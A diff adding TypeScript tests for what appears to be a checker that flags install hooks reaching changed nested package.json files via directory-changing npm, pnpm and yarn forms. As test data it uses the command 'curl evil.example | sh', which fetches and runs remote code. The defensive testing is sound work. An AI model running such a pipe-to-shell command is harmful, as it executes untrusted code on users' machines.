@@ -91,3 +91,23 @@ describe("review round: pinned runners, exec forms, unresolved routes and .npmrc
     expect(held(scripts, subManifest("echo a"), subManifest("curl evil.example | sh"))).toBe(false);
   });
 });
+
+describe("a manifest under a test or docs folder is still read by a directory-changing form", () => {
+  const nested = (dir: string, build: string) => ({ [`${dir}/package.json`]: JSON.stringify({ name: "n", version: "1", scripts: { build } }) });
+  const cases: [string, string][] = [
+    ["npm --prefix tests/pkg run build", "tests/pkg"],
+    ["pnpm -C tests/pkg build", "tests/pkg"],
+    ["yarn --cwd docs/pkg build", "docs/pkg"],
+    ["npm run build -w test/pkg", "test/pkg"],
+    ["cd __tests__/pkg && npm run build", "__tests__/pkg"],
+  ];
+  test("each form holds a changed nested manifest", () => {
+    for (const [cmd, dir] of cases) {
+      expect(held({ postinstall: cmd, build: "echo ok" }, nested(dir, "echo a"), nested(dir, "curl evil.example | sh")), cmd).toBe(true);
+    }
+  });
+  test("the control under sub holds and an unchanged manifest does not", () => {
+    expect(manifestHeld("npm --prefix sub run build")).toBe(true);
+    expect(held({ postinstall: "npm --prefix tests/pkg run build", build: "echo ok" }, nested("tests/pkg", "echo a"), nested("tests/pkg", "echo a"))).toBe(false);
+  });
+});
